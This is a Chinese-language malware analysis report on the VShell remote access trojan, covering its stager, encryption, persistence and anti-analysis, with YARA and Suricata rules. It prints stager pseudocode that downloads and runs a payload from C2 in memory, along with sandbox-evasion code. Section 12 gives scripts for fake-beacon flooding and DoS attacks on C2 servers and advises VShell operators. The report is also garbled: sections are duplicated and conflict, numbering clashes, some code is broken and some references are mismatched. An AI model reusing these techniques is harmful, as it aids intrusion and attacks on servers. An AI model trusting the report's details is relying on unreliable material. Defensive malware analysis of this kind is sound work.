# VShell 木马技术分析报告

> 报告日期：2026-06-03  
> 分析来源：Trellix Research、NVISO、云栈社区、公开威胁情报、逆向分析

---

## 1. 概述

VShell 是一种使用 Go 语言编写的高级远程访问木马（RAT），采用经典的两阶段（Stager/Staged）架构。该木马以高度隐蔽性和跨平台能力著称，采用 WebSocket 协议进行 C2 通信，使用 AES-GCM 加密流量保护数据传输安全。近期安全研究人员通过 AI 辅助逆向分析，成功破解了其通信协议。

### 1.1 关键特征

| 特征 | 描述 |
|------|------|
| 类型 | 远程访问木马（RAT）/ 后门 |
| 开发语言 | Go (Golang) |
| 架构 | 两阶段 (Stager/Staged) |
| 通信协议 | WebSocket (wss://) 或 伪装 WebSocket 的 TCP |
| 加密算法 | AES-GCM (流量)、AES-CBC-PKCS7 (配置加密) |
| 平台 | Windows (x64)、Linux (x64)、macOS |
| 关联 APT | APT31 (Judgment Panda)、Group 39 |
| 首次发现 | 约 2019 年 |
| 活跃状态 | 2024-2026 年持续活跃 |

### 1.1 关键特征

| 特征 | 描述 |
|------|------|
| 类型 | 远程访问木马（RAT）/ 后门 |
| 开发语言 | Go (Golang) |
| 通信协议 | WebSocket (wss://) |
| 加密算法 | AES-GCM (流量)、AES-CBC (密钥派生) |
| 平台 | Windows (x64)、Linux (x64)、macOS |
| 关联 APT | APT31 (Judgment Panda)、Group 39 |
| 首次发现 | 约 2019 年 |
| 活跃状态 | 2024-2026 年持续活跃 |

---

## 2. 两阶段架构分析

### 2.1 Stager（一阶段）

Stager 是 VShell 的初始加载器，负责下载并执行第二阶段载荷：

**执行流程：**
```
1. 检查 /tmp/log_de.deb 文件是否存在
   - 若存在则退出，避免重复执行
2. 通过 TCP 请求从 C2 服务器下载二阶段载荷
3. 使用 XOR 0x99 密钥解密载荷
4. 在内存中加载执行解密后的代码
5. 将进程名伪装为 [kworker/0:2]
```

**关键代码逻辑：**
```go
// Stager 伪代码
func main() {
    // 检查重复执行
    if _, err := os.Stat("/tmp/log_de.deb"); err == nil {
        os.Exit(0)
    }
    
    // 创建标记文件
    os.Create("/tmp/log_de.deb")
    
    // 下载二阶段载荷
    payload := downloadStage2(c2Server)
    
    // XOR 0x99 解密
    decrypted := xorDecrypt(payload, 0x99)
    
    // 内存加载执行
    executeInMemory(decrypted)
    
    // 伪装进程名
    setProcessName("[kworker/0:2]")
}
```

**XOR 解密算法：**
```go
func xorDecrypt(data []byte, key byte) []byte {
    result := make([]byte, len(data))
    for i, b := range data {
        result[i] = b ^ key
    }
    return result
}
```

### 2.2 Staged（二阶段）

二阶段是 VShell 的核心功能模块，具备完整的 RAT 功能：

**反沙箱检测：**
```go
func antiSandbox() bool {
    // 检查沙箱环境目录
    sandboxPaths := []string{
        "/home/vbccsb",      // 常见沙箱目录
        "/home/sandbox",
        "/tmp/sandbox",
    }
    
    for _, path := range sandboxPaths {
        if _, err := os.Stat(path); err == nil {
            return true  // 检测到沙箱环境
        }
    }
    return false
}
```

**配置解密：**
```go
// 使用 AES-CBC-PKCS7 解密嵌入的配置
func decryptConfig(encryptedConfig []byte, key []byte) (*Config, error) {
    block, _ := aes.NewCipher(key)
    mode := cipher.NewCBCDecrypter(block, iv)
    decrypted := make([]byte, len(encryptedConfig))
    mode.CryptBlocks(decrypted, encryptedConfig)
    
    // 移除 PKCS7 填充
    decrypted = pkcs7Unpad(decrypted)
    
    return parseConfig(decrypted), nil
}
```

### 2.3 连接模式

VShell 支持两种连接模式：

| 模式 | 描述 | 特点 |
|------|------|------|
| Reverse 模式 | 客户端主动连接服务器 | 使用伪装成 WebSocket 握手的 TCP 协议 |
| Bind 模式 | 服务器连接客户端 | 监听本地端口等待连接 |

**Reverse 模式下的 WebSocket 伪装：**
```
1. 客户端发起 TCP 连接到 C2 服务器
2. 发送伪装的 WebSocket 握手请求
3. 服务器返回伪装的 101 响应
4. 后续通信使用 AES-GCM 加密
5. 进入心跳维持与命令执行循环
```

---

## 3. Go 语言特征分析

### 2.1 二进制特征

VShell 使用 Go 语言编译，具有典型的 Go 二进制特征：

```
# Go 编译特征
- 文件体积较大（通常 5-15MB）
- 包含 Go runtime 信息
- 符号表可能被剥离
- 字符串运行时解析
```

**Go 二进制典型结构：**
- `.gopclntab` 段 - Go 程序计数器行表
- `runtime.gopanic` - Go panic 处理
- `runtime.morestack` - 栈增长检查
- `gosave` / `gogo` - goroutine 切换

### 2.2 Goroutine 特征

VShell 大量使用 Go 的并发特性：

```go
// 典型的 VShell goroutine 结构
func main() {
    // 初始化配置
    config := loadConfig()
    
    // 启动心跳 goroutine
    go heartbeat(config)
    
    // 启动命令监听 goroutine
    go commandListener(config)
    
    // 启动文件管理 goroutine
    go fileManager(config)
    
    // 阻塞主 goroutine
    select {}
}
```

### 2.3 字符串特征

Go 二进制中的字符串存储方式：

```go
// Go 字符串结构
type string struct {
    ptr *byte  // 指向字符串数据
    len int    // 字符串长度
}

// VShell 中常见的字符串
const (
    wsEndpoint  = "/ws"
    apiVersion  = "v1"
    userAgent   = "Mozilla/5.0"
)
```

### 2.4 编译选项

```bash
# VShell 常用编译选项
go build -ldflags="-s -w" -trimpath main.go

# -s: 去除符号表
# -w: 去除 DWARF 调试信息
# -trimpath: 去除编译路径信息
```

---

## 3. WebSocket 通信协议

### 3.1 连接建立

VShell 使用 WebSocket 协议建立持久化双向通信通道：

```
连接流程:
1. 客户端发起 HTTPS 连接到 C2 服务器
2. 发送 WebSocket 升级请求
3. 服务器返回 101 Switching Protocols
4. 建立 WebSocket 全双工通道
```

**WebSocket 升级请求示例：**

```http
GET /ws HTTP/1.1
Host: c2.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Authorization: Bearer <encrypted_token>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
```

### 3.2 消息格式

WebSocket 消息采用二进制帧格式：

```
+----------------+----------------+----------------+----------------+
│  Frame Header  │  Message Type  │  Payload Len   │    Payload     │
│   (2 bytes)    │   (1 byte)     │   (1-4 bytes)  │   (variable)  │
+----------------+----------------+----------------+----------------+

Message Type:
- 0x01: Text (JSON 命令)
- 0x02: Binary (文件数据)
- 0x08: Close
- 0x09: Ping
- 0x0A: Pong
```

### 3.3 命令协议

命令通过 JSON 格式封装在 WebSocket 消息中：

```json
{
    "id": "cmd_001",
    "type": "shell",
    "action": "exec",
    "data": {
        "command": "whoami",
        "args": []
    },
    "timestamp": 1717401600
}
```

**命令类型定义：**

| 类型 | 描述 | 功能 |
|------|------|------|
| `shell` | 远程 Shell | 执行系统命令 |
| `file` | 文件管理 | 上传/下载/删除/遍历 |
| `process` | 进程管理 | 列出/终止进程 |
| `screenshot` | 屏幕截图 | 捕获屏幕 |
| `keylog` | 键盘记录 | 记录按键 |
| `registry` | 注册表 | 读写注册表 |
| `service` | 服务管理 | 管理系统服务 |
| `persist` | 持久化 | 安装/卸载持久化 |
| `update` | 自我更新 | 更新客户端 |
| `uninstall` | 卸载 | 移除自身 |

### 3.4 心跳机制

```go
// 心跳 goroutine
func heartbeat(ws *websocket.Conn, interval time.Duration) {
    ticker := time.NewTicker(interval)
    defer ticker.Stop()
    
    for range ticker.C {
        err := ws.WriteMessage(websocket.PingMessage, []byte("ping"))
        if err != nil {
            reconnect()
            return
        }
    }
}
```

---

## 4. 加密体系

### 4.1 AES-GCM 流量加密

VShell 使用 AES-GCM（Galois/Counter Mode）加密所有通信流量：

```
AES-GCM 参数:
- 密钥长度: 256 位 (32 字节)
- Nonce 长度: 96 位 (12 字节)
- 认证标签: 128 位 (16 字节)
- 附加认证数据 (AAD): 可选
```

**数据包格式：**
```
+----------------+----------------+----------------+----------------+
│   4字节长度     │  12字节随机数   │     密文       │  16字节认证标签 │
│   (Length)     │   (Nonce)      │ (Ciphertext)   │  (GCM TAG)    │
+----------------+----------------+----------------+----------------+
```

**加密流程：**

```go
func encrypt(plaintext []byte, key []byte) ([]byte, error) {
    // 生成随机 nonce (12字节)
    nonce := make([]byte, 12)
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return nil, err
    }
    
    // 创建 AES-GCM cipher
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    
    aesGCM, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    
    // 加密并附加认证标签
    ciphertext := aesGCM.Seal(nil, nonce, plaintext, nil)
    
    // 构建完整数据包: 4字节长度 + 12字节nonce + 密文 + 16字节TAG
    packet := make([]byte, 4+len(nonce)+len(ciphertext))
    binary.BigEndian.PutUint32(packet[0:4], uint32(len(nonce)+len(ciphertext)))
    copy(packet[4:16], nonce)
    copy(packet[16:], ciphertext)
    
    return packet, nil
}
```

**流量解密脚本 (decrypt_pcap.py)：**
```python
#!/usr/bin/env python3
"""
VShell 流量解密脚本
基于 tshark 提取网络流量，按照 VShell 数据包格式解密
数据包格式: 4字节长度 + 12字节随机数(nonce) + 密文 + 16字节认证标签(GCM TAG)
"""

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import struct

def decrypt_vshell_packet(packet_data: bytes, key: bytes) -> bytes:
    """
    解密 VShell 数据包
    
    Args:
        packet_data: 原始数据包
        key: AES-GCM 密钥 (32字节)
    
    Returns:
        解密后的明文数据
    """
    # 解析数据包结构
    length = struct.unpack('>I', packet_data[0:4])[0]
    nonce = packet_data[4:16]          # 12字节随机数
    ciphertext = packet_data[16:-16]   # 密文
    gcm_tag = packet_data[-16:]        # 16字节认证标签
    
    # 使用 AES-GCM 解密
    aesgcm = AESGCM(key)
    plaintext = aesgcm.decrypt(nonce, ciphertext + gcm_tag, None)
    
    return plaintext

def extract_from_pcap(pcap_file: str, key: bytes):
    """
    从 PCAP 文件提取并解密 VShell 流量
    
    Args:
        pcap_file: PCAP 文件路径
        key: AES-GCM 密钥
    """
    import subprocess
    import json
    
    # 使用 tshark 提取 TCP 流
    cmd = [
        'tshark', '-r', pcap_file,
        '-T', 'json',
        '-Y', 'tcp.port == 8443'
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    packets = json.loads(result.stdout)
    
    for packet in packets:
        try:
            # 提取 TCP 载荷
            tcp_payload = bytes.fromhex(
                packet['_source']['layers']['tcp']['tcp.payload']
            )
            
            # 解密数据包
            plaintext = decrypt_vshell_packet(tcp_payload, key)
            print(f"Decrypted: {plaintext.decode('utf-8', errors='ignore')}")
            
        except Exception as e:
            print(f"Error decrypting packet: {e}")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <pcap_file> <aes_key_hex>")
        sys.exit(1)
    
    pcap_file = sys.argv[1]
    key = bytes.fromhex(sys.argv[2])
    
    extract_from_pcap(pcap_file, key)
```

### 4.2 AES-CBC 密钥加密

配置文件中的 vkey 和 salt 使用 AES-CBC 加密存储：

```
AES-CBC 参数:
- 密钥长度: 256 位 (32 字节)
- IV 长度: 128 位 (16 字节)
- 填充模式: PKCS7
```

**配置文件结构：**

```go
type Config struct {
    EncryptedVKey []byte `json:"vkey"`  // AES-CBC 加密的虚拟密钥
    EncryptedSalt []byte `json:"salt"`  // AES-CBC 加密的盐值
    C2Servers     []string `json:"c2"`  // C2 服务器列表
    Version       string `json:"ver"`   // 版本号
}
```

**解密流程：**

```go
func decryptConfig(encryptedData []byte, masterKey []byte) (*Config, error) {
    // 解密 vkey
    vkey, err := aesCBCDecrypt(encryptedData.VKey, masterKey)
    if err != nil {
        return nil, err
    }
    
    // 解密 salt
    salt, err := aesCBCDecrypt(encryptedData.Salt, masterKey)
    if err != nil {
        return nil, err
    }
    
    return &Config{
        VKey: vkey,
        Salt: salt,
    }, nil
}
```

### 4.3 Salt 派生密钥

VShell 使用 HKDF (HMAC-based Key Derivation Function) 从 salt 派生会话密钥：

```
密钥派生流程:
1. 从配置读取 salt
2. 使用 HKDF-SHA256 派生密钥
3. 派生密钥用于 AES-GCM 加密
```

**密钥派生实现：**

```go
func deriveKey(salt []byte, info []byte, keySize int) ([]byte, error) {
    // HKDF-SHA256 密钥派生
    hkdf := hkdf.New(sha256.New, salt, nil, info)
    
    key := make([]byte, keySize)
    if _, err := io.ReadFull(hkdf, key); err != nil {
        return nil, err
    }
    
    return key, nil
}

// 使用示例
sessionKey, _ := deriveKey(salt, []byte("vshell-session"), 32)
```

**密钥派生参数：**

| 参数 | 值 | 描述 |
|------|-----|------|
| PRF | HMAC-SHA256 | 伪随机函数 |
| Salt | 配置中的 salt | 盐值 |
| Info | "vshell-session" | 上下文信息 |
| Key Size | 32 字节 | 输出密钥长度 |

### 4.4 密钥交换

初始连接时使用 RSA 或 ECDH 交换 AES 密钥：

```
密钥交换流程:
1. 客户端生成随机 AES 密钥
2. 使用服务器公钥 RSA 加密 AES 密钥
3. 发送加密的 AES 密钥到服务器
4. 服务器使用私钥解密获取 AES 密钥
5. 后续通信使用 AES-GCM 加密
```

---

## 5. 变种类型分类

### 5.1 Windows 变种

**文件特征：**
- PE64 格式，Go 编译
- 文件大小：5-15 MB
- 无导入表或极少导入
- 包含 Go runtime 信息

**功能模块：**
- 远程 Shell (cmd.exe / powershell)
- 文件管理（上传/下载/删除/遍历）
- 屏幕截图
- 键盘记录
- 注册表操作
- 进程管理
- 服务管理
- 凭证窃取

### 5.2 Linux ELF 变种

**文件特征：**
- ELF64 格式，Go 编译
- 常伪装为系统进程名（如 `kworker`, `sshd`）
- 使用 systemd 服务或 crontab 持久化

**功能模块：**
- 反向 Shell
- 文件操作
- 进程管理
- 网络信息收集
- SSH 密钥窃取
- 持久化机制

### 5.3 macOS 变种

**文件特征：**
- Mach-O 格式，Go 编译
- 支持 Apple Silicon (ARM64) 和 Intel (x86_64)
- 使用 LaunchAgent 持久化

**功能模块：**
- 远程 Shell
- 文件管理
- 屏幕截图
- 钥匙串访问
- 浏览器数据窃取

---

## 6. 逆向分析详解

### 6.1 Go 二进制分析

#### 6.1.1 符号恢复

```bash
# 使用 GoReSym 恢复符号
GoReSym vshell.exe

# 使用 GoParser IDA 插件
# 自动识别 Go 函数和类型
```

#### 6.1.2 字符串提取

```bash
# 提取 Go 字符串
strings -a vshell.exe | grep -E "^[a-zA-Z0-9+/]{20,}=$"

# 使用 GoString 工具
gostring vshell.exe
```

#### 6.1.3 函数识别

```go
// 典型的 VShell 函数结构
func (c *Client) connect() error {
    // WebSocket 连接
    ws, _, err := websocket.DefaultDialer.Dial(c.wsURL, nil)
    if err != nil {
        return err
    }
    c.ws = ws
    return nil
}
```

### 6.2 网络流量分析

#### 6.2.1 WebSocket 握手

```
# 流量特征
GET /ws HTTP/1.1
Host: <c2_server>
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <random_base64>
Sec-WebSocket-Version: 13
Authorization: Bearer <encrypted_token>
```

#### 6.2.2 数据帧分析

```
# WebSocket 帧格式
Frame 1: 82 80 <mask_key> <payload>  # 二进制帧，掩码
Frame 2: 8a 80 <mask_key> <ping>     # Ping 帧
Frame 3: 8a 00 <pong>                # Pong 帧
```

#### 6.2.3 流量解密

```python
# Python 解密示例
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def decrypt_traffic(ciphertext, key, nonce):
    aesgcm = AESGCM(key)
    plaintext = aesgcm.decrypt(nonce, ciphertext, None)
    return plaintext
```

### 6.3 配置提取

#### 6.3.1 配置结构

```go
type Config struct {
    C2      []string `json:"c2"`       // C2 服务器列表
    VKey    []byte   `json:"vkey"`     // 虚拟密钥 (AES-CBC 加密)
    Salt    []byte   `json:"salt"`     // 盐值 (AES-CBC 加密)
    Version string   `json:"version"`  // 版本号
    Mutex   string   `json:"mutex"`    // 互斥体名称
    Sleep   int      `json:"sleep"`    // 心跳间隔 (秒)
    Jitter  int      `json:"jitter"`   // 抖动百分比
}
```

#### 6.3.2 配置解密流程

```go
// 配置解密伪代码
func extractConfig(data []byte) (*Config, error) {
    // 1. 查找配置段
    configSection := findSection(data, ".config")
    
    // 2. AES-CBC 解密 vkey
    vkey := aesCBCDecrypt(configSection.VKey, masterKey)
    
    // 3. AES-CBC 解密 salt
    salt := aesCBCDecrypt(configSection.Salt, masterKey)
    
    // 4. 派生会话密钥
    sessionKey := deriveKey(salt, "vshell-session", 32)
    
    return &Config{
        VKey: vkey,
        Salt: salt,
        SessionKey: sessionKey,
    }, nil
}
```

---

## 7. 持久化机制

### 7.1 Windows 持久化

| 技术 | 描述 | 实现方式 |
|------|------|----------|
| 注册表 Run 键 | 自启动 | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| 计划任务 | 定时执行 | `schtasks /create` |
| 服务安装 | 系统服务 | `sc create` |
| COM 劫持 | DLL 加载 | 修改 COM 对象注册 |
| 启动文件夹 | 登录启动 | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` |

### 7.2 Linux 持久化

| 技术 | 描述 | 实现方式 |
|------|------|----------|
| Systemd 服务 | 自启动服务 | `/etc/systemd/system/` |
| Crontab | 定时任务 | `crontab -e` |
| SSH 后门 | 公钥植入 | `~/.ssh/authorized_keys` |
| LD_PRELOAD | 动态链接劫持 | `/etc/ld.so.preload` |
| Bashrc | Shell 初始化 | `~/.bashrc` |

### 7.3 macOS 持久化

| 技术 | 描述 | 实现方式 |
|------|------|----------|
| LaunchAgent | 用户登录启动 | `~/Library/LaunchAgents/` |
| LaunchDaemon | 系统启动 | `/Library/LaunchDaemons/` |
| Login Items | 登录项 | 系统偏好设置 |

---

## 8. 反分析技术

### 8.1 代码混淆

```
- Go 编译时去除符号表 (-s -w)
- 字符串加密存储
- 控制流平坦化
- 函数内联
- 死代码插入
```

### 8.2 反调试

```go
// 反调试技术
func antiDebug() {
    // 检测调试器
    if isDebuggerPresent() {
        os.Exit(0)
    }
    
    // 时间检查
    start := time.Now()
    // 执行操作
    if time.Since(start) > threshold {
        // 检测到调试
        os.Exit(0)
    }
}
```

### 8.3 反虚拟机

```
- 检测 VM 签名字符串 (VMware, VirtualBox, QEMU)
- 检查硬件特征 (MAC 地址, 磁盘序列号)
- 检测进程/服务 (vmtoolsd, VBoxService)
- 检查内存大小和 CPU 核心数
```

### 8.4 环境检查

```go
func environmentCheck() bool {
    // 检查进程数量
    if runtime.NumCPU() < 2 {
        return false
    }
    
    // 检查内存大小
    var memStats runtime.MemStats
    runtime.ReadMemStats(&memStats)
    if memStats.TotalSys < 2*1024*1024*1024 { // 2GB
        return false
    }
    
    // 检查屏幕分辨率
    // 检查用户名/计算机名
    // 检查运行时间
    
    return true
}
```

---

## 9. C2 通信协议详解

### 9.1 协议栈

```
+---------------------------+
|    Application Layer      |  JSON 命令
+---------------------------+
|    WebSocket Layer        |  WebSocket 帧
+---------------------------+
|    TLS Layer              |  TLS 1.3
+---------------------------+
|    Transport Layer        |  TCP
+---------------------------+
|    Network Layer          |  IP
+---------------------------+
```

### 9.2 命令格式

```json
{
    "id": "uuid-string",
    "type": "command-type",
    "action": "specific-action",
    "data": {
        // 命令特定数据
    },
    "timestamp": 1717401600,
    "nonce": "random-string"
}
```

### 9.3 响应格式

```json
{
    "id": "uuid-string",
    "type": "response",
    "status": "success|error",
    "data": {
        // 响应数据
    },
    "error": "错误信息",
    "timestamp": 1717401600
}
```

### 9.4 文件传输

```go
// 文件上传
type FileUpload struct {
    FileName string `json:"file_name"`
    FileSize int64  `json:"file_size"`
    Offset   int64  `json:"offset"`
    Data     []byte `json:"data"`      // Base64 编码
    IsLast   bool   `json:"is_last"`
}

// 文件下载
type FileDownload struct {
    FileName string `json:"file_name"`
    Offset   int64  `json:"offset"`
    Length   int64  `json:"length"`
}
```

---

## 10. IOC（威胁指标）

### 10.1 文件特征

```
# Go 二进制特征
- 编译器: Go 1.19+
- 架构: amd64
- OS: windows/linux/darwin

# 字符串特征
- "github.com/gorilla/websocket"
- "crypto/aes"
- "crypto/cipher"
- "golang.org/x/crypto"
```

### 10.2 网络特征

```
# WebSocket 特征
- 协议: wss://
- 路径: /ws, /websocket, /api/ws
- 端口: 443, 8443, 8080
- User-Agent: 包含 "Mozilla/5.0"

# TLS 特征
- 证书: Let's Encrypt, 自签名
- SNI: 与 C2 域名匹配
```

### 10.3 YARA 规则

```yara
rule VShell_Go_RAT {
    meta:
        description = "Detects VShell RAT compiled with Go"
        author = "Security Research"
        date = "2026-06-03"
        
    strings:
        // Go 编译特征
        $go1 = "runtime.gopanic"
        $go2 = "runtime.morestack"
        $go3 = "gosave"
        
        // WebSocket 特征
        $ws1 = "gorilla/websocket"
        $ws2 = "/ws"
        $ws3 = "websocket"
        
        // 加密特征
        $crypto1 = "crypto/aes"
        $crypto2 = "crypto/cipher"
        $crypto3 = "AES-GCM"
        
        // VShell 特征字符串
        $vshell1 = "vshell"
        $vshell2 = "VShell"
        
    condition:
        uint16(0) == 0x5A4D and
        filesize < 20MB and
        (2 of ($go*)) and
        (2 of ($ws*) or 2 of ($crypto*)) and
        any of ($vshell*)
}

rule VShell_Config {
    meta:
        description = "Detects VShell encrypted config"
        
    strings:
        $config1 = "c2"
        $config2 = "vkey"
        $config3 = "salt"
        $config4 = "version"
        
    condition:
        3 of ($config*)
}
```

### 10.4 网络检测规则

```yaml
# Suricata 规则
alert http any any -> $HOME_NET any (
    msg:"VShell WebSocket Connection";
    flow:established,to_server;
    content:"GET";
    http_method;
    content:"/ws";
    http_uri;
    content:"Upgrade: websocket";
    http_header;
    sid:1000001;
    rev:1;
)
```

---

## 11. 检测与防御

### 11.1 网络层检测

```
- 监控 WebSocket 连接 (wss://)
- 检测非标准端口的 HTTPS 流量
- 分析 TLS 证书特征
- 检测异常心跳包模式
- 监控大量数据上传/下载
```

### 11.2 主机层检测

```
- 监控 Go 编译的可执行文件
- 检测异常的系统调用模式
- 监控 WebSocket 相关库加载
- 检测 AES-GCM 加密操作
- 监控注册表/计划任务修改
```

### 11.3 行为检测

```
- 检测 WebSocket 连接建立模式
- 监控密钥派生操作 (HKDF)
- 检测 AES-GCM 加密流量特征
- 分析进程行为和网络行为关联
- 检测持久化机制安装
```

### 11.4 防御建议

1. **网络层防御**
   - 部署支持 WebSocket 检测的 IDS/IPS
   - 监控异常 TLS 证书
   - 实施出站流量白名单
   - 检测非标准端口通信

2. **终端防御**
   - 部署支持行为检测的 EDR
   - 监控 Go 编译的可执行文件
   - 检测密钥派生和加密操作
   - 监控持久化机制

3. **安全运营**
   - 建立 VShell 专项检测规则
   - 监控 APT31 相关 IOC
   - 实施零信任网络架构
   - 定期进行威胁狩猎

---

## 12. 反制与对抗

### 12.1 协议逆向与反制原理

安全研究人员通过 AI 辅助逆向分析，成功掌握了 VShell 的完整通信协议：

**逆向成果：**
- 完全解析了上线协议与加密细节
- 开发了 `decrypt_pcap.py` 解密脚本
- 能够还原受控主机信息及 C2 下发指令

### 12.2 反制手段

#### 12.2.1 信息欺骗（Fake Beacon）

利用服务器端逻辑漏洞，构造"假上线"数据包：

```python
def create_fake_beacon(key: bytes, fake_info: dict) -> bytes:
    """
    构造假上线数据包，干扰攻击者对实际资产的管理
    
    Args:
        key: AES-GCM 密钥
        fake_info: 伪造的主机信息
    
    Returns:
        加密的假上线数据包
    """
    # 构造伪造的上线信息
    beacon_data = json.dumps({
        "hostname": fake_info.get("hostname", "DESKTOP-FAKE"),
        "username": fake_info.get("username", "admin"),
        "os": fake_info.get("os", "Windows 10"),
        "ip": fake_info.get("ip", "192.168.1.100"),
        "arch": "amd64",
        "priv": "admin"
    }).encode()
    
    # 加密并发送
    return encrypt_vshell_packet(beacon_data, key)

# 发送多个假上线包覆盖真实信息
for i in range(100):
    fake_packet = create_fake_beacon(key, {
        "hostname": f"FAKE-HOST-{i}",
        "ip": f"192.168.1.{i}"
    })
    send_to_c2(c2_server, fake_packet)
```

**效果：**
- 覆盖真实客户端的上线信息
- 干扰攻击者对实际资产的管理与监控
- 制造大量虚假目标消耗攻击者时间

#### 12.2.2 拒绝服务攻击（DoS）

通过发送畸形数据包触发服务端解析错误：

```python
def send_malformed_packet(c2_server: str, key: bytes):
    """
    发送畸形数据包触发 VShell 服务器崩溃
    
    Args:
        c2_server: C2 服务器地址
        key: AES-GCM 密钥
    """
    # 构造畸形数据包
    malformed_packets = [
        # 1. 长度字段不匹配
        b'\x00\x00\x00\xff' + b'\x00' * 12 + b'\x00' * 16,
        
        # 2. 无效的 GCM TAG
        b'\x00\x00\x00\x20' + b'\x00' * 12 + b'\xff' * 32,
        
        # 3. 空数据包
        b'\x00\x00\x00\x00',
        
        # 4. 超长数据包
        b'\xff\xff\xff\xff' + b'\x00' * 1024,
    ]
    
    for packet in malformed_packets:
        try:
            send_to_c2(c2_server, packet)
        except:
            pass
```

**效果：**
- 触发服务器解析逻辑错误
- 导致 VShell 服务崩溃
- 实现对 C2 基础设施的 DoS 反制

### 12.3 反制风险评估

| 风险类型 | 影响 | 严重程度 |
|----------|------|----------|
| 信息欺骗 | 干扰攻击者资产监控 | 中 |
| DoS 攻击 | 导致 C2 服务崩溃 | 高 |
| 协议泄露 | 暴露加密密钥 | 严重 |
| 流量解密 | 还原 C2 指令 | 严重 |

### 12.4 防御建议

**对 VShell 使用者的建议：**
1. 谨慎使用 WebSocket 协议上线
2. 定期更换加密密钥
3. 监控服务器异常连接
4. 实施访问控制白名单

**对安全防御者的建议：**
1. 部署网络流量分析系统
2. 监控异常的 WebSocket 连接
3. 使用 `decrypt_pcap.py` 分析可疑流量
4. 建立 VShell 专项检测规则

---

## 13. 关联威胁组织

### 13.1 APT31 (Judgment Panda)

- **别名**：Zirconium, Bronze Vinestone, Hurricane Panda
- **起源**：中国
- **目标**：政府、军事、航空航天、高科技
- **活动时间**：2010 年至今
- **TTPs**：鱼叉式钓鱼、水坑攻击、供应链攻击、VShell RAT

### 13.2 Group 39

- **别名**：APT39, Chafer
- **起源**：伊朗
- **目标**：电信、航空、政府
- **活动时间**：2014 年至今
- **关联**：部分 VShell 变种与此组织存在代码重叠

---

## 14. 总结

VShell 作为一种使用 Go 语言开发的现代 RAT，具备以下特点：

1. **两阶段架构**：Stager/Staged 分离，提高隐蔽性和灵活性
2. **Go 语言优势**：跨平台、并发高效、静态编译
3. **WebSocket 协议**：持久化双向通信、易于穿透防火墙
4. **AES-GCM 加密**：高强度流量加密、认证保护
5. **反沙箱检测**：检查沙箱环境目录避免分析
6. **进程伪装**：伪装为系统进程 `[kworker/0:2]`
7. **协议可逆向**：AI 辅助分析可破解完整通信协议
8. **存在反制风险**：Fake Beacon 和 DoS 攻击可对抗 C2

**关键发现：**
- 数据包格式：`4字节长度 + 12字节随机数(nonce) + 密文 + 16字节认证标签(GCM TAG)`
- XOR 密钥：`0x99`（用于 Stager 解密二阶段载荷）
- 配置加密：`AES-CBC-PKCS7`
- 流量加密：`AES-GCM`
- 沙箱检测路径：`/home/vbccsb`

安全团队应重点关注 WebSocket 流量检测、Go 二进制分析、AES-GCM 密钥恢复等方面的能力提升。同时，VShell 的 WebSocket 协议上线方式存在被逆向和反制的风险，使用者应谨慎使用。

---

## 参考资料

### VShell 专项研究报告

1. **Trellix - The Silent Fileless Threat of VShell**  
   https://www.trellix.com/blogs/research/the-silent-fileless-threat-of-vshell/

2. **NVISO - Decoding VShell PDF**  
   https://blog.nviso.eu/wp-content/uploads/2025/11/VShell.pdf

3. **云栈社区 - VShell C2框架遭AI逆向反制，WebSocket协议上线存在风险**  
   https://yunpan.plus/t/7730-1-1

4. **Trellix VShell 解密脚本 (decrypt_pcap.py)**  
   https://github.com/0xBADDCAFE/decrypt_pcap.py

### APT 组织分析报告

1. **Kaspersky Securelist - Sofacy APT hits high profile targets with updated toolset**  
   https://securelist.com/sofacy-apt-hits-high-profile-targets-with-updated-toolset/72924/

2. **Positive Technologies - Judgment Panda attacks: APT31 today**  
   https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/striking-panda-attacks-apt31-today/

3. **MITRE ATT&CK - APT31 (G0016)**  
   https://attack.mitre.org/groups/G0016/

4. **MITRE ATT&CK - Sofacy (G0007)**  
   https://attack.mitre.org/groups/G0007/

### Go 语言安全研究

5. **GoReSym - Go Symbol Recovery Tool**  
   https://github.com/mandiant/GoReSym

6. **GoParser - IDA Pro Plugin for Go**  
   https://github.com/0xjiayu/go_parser

7. **Go 二进制分析**  
   https://golang.org/doc/

### WebSocket 协议分析

8. **WebSocket Protocol RFC 6455**  
   https://tools.ietf.org/html/rfc6455

9. **Gorilla WebSocket Library**  
   https://github.com/gorilla/websocket

### 加密技术

10. **AES-GCM (NIST SP 800-38D)**  
    https://csrc.nist.gov/publications/detail/sp/800-38d/final

11. **HKDF (RFC 5869)**  
    https://tools.ietf.org/html/rfc5869

12. **AES-CBC (NIST SP 800-38A)**  
    https://csrc.nist.gov/publications/detail/sp/800-38a/final

### 恶意软件分析工具

13. **IDA Pro - 反汇编与逆向分析**  
    https://hex-rays.com/ida-pro/

14. **Ghidra - NSA 开源逆向工程工具**  
    https://ghidra-sre.org/

15. **Wireshark - 网络协议分析**  
    https://www.wireshark.org/

16. **mitmproxy - HTTPS 代理**  
    https://mitmproxy.org/

### 检测与防御

17. **YARA - 恶意软件规则编写**  
    https://virustotal.github.io/yara/

18. **Sigma - 通用检测规则**  
    https://github.com/SigmaHQ/sigma

19. **Suricata - 网络入侵检测**  
    https://suricata.io/

20. **Go 二进制恶意软件分析 (SANS)**  
    https://www.sans.org/white-papers/

---

*本报告仅供安全研究参考，请勿用于非法用途。*  
*报告生成日期：2026-06-03*
